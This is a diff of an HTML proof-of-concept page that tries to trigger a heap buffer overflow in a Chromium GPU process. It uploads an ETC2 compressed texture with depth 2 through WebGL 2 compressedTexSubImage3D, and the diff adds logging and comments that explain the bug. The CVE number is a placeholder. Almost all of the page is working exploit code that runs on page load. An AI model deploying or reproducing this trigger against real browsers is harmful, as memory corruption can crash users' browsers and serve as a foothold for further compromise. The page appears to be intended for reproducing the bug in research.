@@ -1,25 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>WebGL 2 Heap Overflow PoC</title>
+<title>WebGL 2 Heap Overflow PoC (CVE-2024-XXXX)</title>
+<style>
+  body { font-family: sans-serif; padding: 20px; }
+  #status { margin-top: 10px; font-weight: bold; }
+  .log { font-family: monospace; white-space: pre-wrap; background: #f0f0f0; padding: 10px; border: 1px solid #ccc; }
+</style>
 </head>
 <body>
-<canvas id="c"></canvas>
+<h1>WebGL 2 Heap Overflow PoC</h1>
+<p>This page attempts to trigger a Heap Buffer Overflow in the GPU process by uploading a 3D compressed texture.</p>
+<p><b>Requirement:</b> Chromium build with AddressSanitizer (ASAN) enabled.</p>
+<canvas id="c" width="32" height="32" style="border:1px solid black;"></canvas>
+<div id="status">Initializing...</div>
+<div id="log" class="log"></div>
+
 <script>
+function log(msg) {
+  var div = document.getElementById("log");
+  div.textContent += msg + "\n";
+  console.log(msg);
+}
+
 function start() {
   var canvas = document.getElementById("c");
   var gl = canvas.getContext("webgl2");
   if (!gl) {
-    console.log("WebGL 2 not supported");
+    document.getElementById("status").textContent = "WebGL 2 not supported.";
+    log("Error: WebGL 2 is not supported in this browser.");
     return;
   }
 
+  log("WebGL 2 context created.");
+
   var ext = gl.getExtension("WEBGL_compressed_texture_etc");
   if (!ext) {
-    // Try other compressed formats if ETC is not available,
-    // but ETC2 is mandatory in GLES 3.0 so commonly available or emulated.
-    // If emulated on desktop, this hits the vulnerable code path.
-    console.log("WEBGL_compressed_texture_etc not supported");
+    log("Warning: WEBGL_compressed_texture_etc not supported. This PoC targets ETC2.");
+    // We proceed anyway because some drivers might support it natively or via other means,
+    // but typically this extension is needed.
+  } else {
+    log("WEBGL_compressed_texture_etc is available.");
   }
 
   // COMPRESSED_RGBA8_ETC2_EAC = 0x9278
@@ -27,41 +48,53 @@ function start() {
 
   var width = 4;
   var height = 4;
-  var depth = 2;
+  var depth = 2; // > 1 to trigger the overflow
 
   // Create a texture
   var tex = gl.createTexture();
   gl.bindTexture(gl.TEXTURE_2D_ARRAY, tex);
+  log("Bound TEXTURE_2D_ARRAY.");
 
   // Allocate storage
   // texStorage3D(target, levels, internalformat, width, height, depth)
   gl.texStorage3D(gl.TEXTURE_2D_ARRAY, 1, format, width, height, depth);
+  log("Allocated storage: 4x4x2");
 
   // Create data for 2 layers.
-  // ETC2 blocks are 4x4 pixels = 8 bytes (for RGB) or 16 bytes (RGBA).
+  // ETC2 blocks are 4x4 pixels = 16 bytes (RGBA).
   // 4x4 image = 1 block.
   // We have 2 layers, so 2 blocks.
-  // Each block is 16 bytes (128 bits) for RGBA8 ETC2.
+  // Total size = 32 bytes.
   var blockSize = 16;
   var dataSize = blockSize * depth;
   var data = new Uint8Array(dataSize);
 
-  // Fill with junk
+  // Fill with junk (0xAA)
   for (var i = 0; i < dataSize; i++) {
     data[i] = 0xAA;
   }
 
-  console.log("Uploading compressed texture data with depth=" + depth);
+  log("Uploading compressed texture data (Depth=" + depth + ", Size=" + dataSize + " bytes)...");
+  document.getElementById("status").textContent = "Triggering vulnerability...";
 
   // Trigger the vulnerability:
-  // compressedTexSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, data)
-  // This calls into the vulnerable DecompressTextureData if software fallback is used.
-  gl.compressedTexSubImage3D(gl.TEXTURE_2D_ARRAY, 0, 0, 0, 0, width, height, depth, format, data);
+  // The browser will calculate allocation size as (width * height * bpp) ignoring depth,
+  // then attempt to write all depth layers into that small buffer.
+  try {
+    gl.compressedTexSubImage3D(gl.TEXTURE_2D_ARRAY, 0, 0, 0, 0, width, height, depth, format, data);
 
-  console.log("Done.");
+    // If we reach here without crashing, it means:
+    // 1. The browser is not vulnerable (patched).
+    // 2. The browser handles ETC2 in hardware (no software decompression).
+    // 3. The heap corruption didn't cause an immediate crash (no ASAN).
+    log("Command executed. If the browser is still alive, no immediate crash occurred.");
+    document.getElementById("status").textContent = "Done. Check ASAN logs.";
+  } catch (e) {
+    log("Error executing compressedTexSubImage3D: " + e);
+  }
 }
 
-start();
+window.onload = start;
 </script>
 </body>
 </html>
